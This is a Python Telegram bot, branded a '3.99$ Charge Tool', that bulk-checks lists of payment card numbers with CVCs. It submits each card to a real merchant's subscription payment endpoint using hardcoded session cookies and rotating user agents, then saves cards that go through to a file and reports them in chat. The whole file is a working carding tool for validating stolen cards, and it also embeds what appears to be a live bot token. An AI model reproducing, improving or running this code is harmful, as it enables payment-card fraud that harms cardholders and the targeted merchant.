import requests
import json
from concurrent.futures import ThreadPoolExecutor
from fake_useragent import UserAgent
from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext

ua = UserAgent()

# Telegram Bot Token
BOT_TOKEN = '7546779723:AAGckCuFIhMfa9h7sUZylW_hQfa_0UsSL7I'

# Function to check card details
def check_card(card_details, chat_id, bot):
    try:
        cn, expm, expy, cv = card_details.strip().split('|')
        expy = expy[-2:]  # Get last two digits of year
        cookies = {
            'sucuri_cloudproxy_uuid_0e749aa32': '9d73b93f5646fab3ec3f5bf1a213d636',
            '_ga': 'GA1.1.414691768.1724575717',
            '_gcl_au': '1.1.1283967854.1724575717',
            'ci_session': 'gmtc8809vskha0fbn19mvae05vm6t341',
            '_ga_4HXMJ7D3T6': 'GS1.1.1724575716.1.1.1724576199.0.0.0',
            '_ga_KQ5ZJRZGQR': 'GS1.1.1724575717.1.1.1724576199.60.0.1944711815',
        }
        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.lagreeod.com',
            'referer': 'https://www.lagreeod.com/subscribe-payment',
            'user-agent': ua.random,
            'x-requested-with': 'XMLHttpRequest',
        }
        data = {
            'card[name]': 'Amid Smith',
            'card[number]': cn,
            'card[exp_month]': expm,
            'card[exp_year]': expy,
            'card[cvc]': cv,
            'coupon': '',
            's1': '15',
            'sum': '21',
        }
        response = requests.post('https://www.lagreeod.com/register/validate_subscribe_step_3', cookies=cookies, headers=headers, data=data)
        response_data = response.json()
        decline_keywords = ['invalid', 'incorrect', 'declined', 'error', 'ErrorException', '402', '500']
        if any(keyword in response_data.get('message', '').lower() for keyword in decline_keywords):
            bot.send_message(chat_id=chat_id, text=f"❌ Declined: {cn}|{expm}|{expy}|{cv} - {response_data.get('message')}")
        else:
            bot.send_message(chat_id=chat_id, text=f"✅ Charged 3.99$: {cn}|{expm}|{expy}|{cv} - {response_data.get('message')}")
            with open("ApprovedCards.txt", "a") as file:
                file.write(f"{cn}|{expm}|{expy}|{cv}\n")
    except json.JSONDecodeError:
        bot.send_message(chat_id=chat_id, text=f"❌ Failed to decode JSON response: {cn}|{expm}|{expy}|{cv}")
    except Exception as e:
        bot.send_message(chat_id=chat_id, text=f"⚠️ Error processing card {cn}|{expm}|{expy}|{cv} - {str(e)}")

# Handler for regular messages
def handle_message(update: Update, context: CallbackContext):
    chat_id = update.message.chat_id
    text = update.message.text

    if text.endswith('.txt'):
        try:
            with open(text, "r", encoding="utf-8") as file:
                cards = file.readlines()
        except Exception as e:
            context.bot.send_message(chat_id=chat_id, text=f"⚠️ Error reading file: {str(e)}")
            return

        max_workers = 5
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            for card in cards:
                executor.submit(check_card, card, chat_id, context.bot)
        context.bot.send_message(chat_id=chat_id, text="✅ Processing cards...")
    else:
        context.bot.send_message(chat_id=chat_id, text="❌ Please send a valid combo file name ending in '.txt'")

# /start command to welcome users
def start(update: Update, context: CallbackContext):
    chat_id = update.message.chat_id
    context.bot.send_message(
        chat_id=chat_id, 
        text="Welcome to the Kurdo 3.99$ Charge Tool Bot!\n\n"
             "Send me the name of a combo file to start checking.\n\n"
             "Developed by @MysticNet"
    )

# /dev command to show developer info
def dev_info(update: Update, context: CallbackContext):
    chat_id = update.message.chat_id
    context.bot.send_message(
        chat_id=chat_id, 
        text="This bot was developed by @MysticNet. Thank you for using it!"
    )

# Main function to set up the bot
def main():
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    # Command handlers
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("dev", dev_info))  # Add /dev command
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))

    # Start the bot
    updater.start_polling()
    updater.idle()

# Run the bot
if __name__ == "__main__":
    main()
